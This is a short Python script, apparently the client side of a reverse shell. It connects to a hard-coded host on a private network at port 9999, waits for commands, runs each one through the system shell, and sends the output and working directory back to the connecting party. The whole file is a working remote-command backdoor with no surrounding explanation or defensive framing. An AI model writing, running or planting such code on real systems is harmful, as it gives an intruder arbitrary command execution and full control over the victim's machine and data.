import socket
import os
import subprocess

s = socket.socket()
host= "192.168.0.112"
port = 9999

#ifconfig o ultimo quadro

s.connect((host,port))


while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    
    if data.decode("utf-8") == "quit-1":
        break
        s.close()
        
    if len(data)>0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell = True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_byte,"utf-8")
        currentWD = "< " + os.getcwd() + " >"
        s.send(str.encode(currentWD + output_string))
        print(output_string)
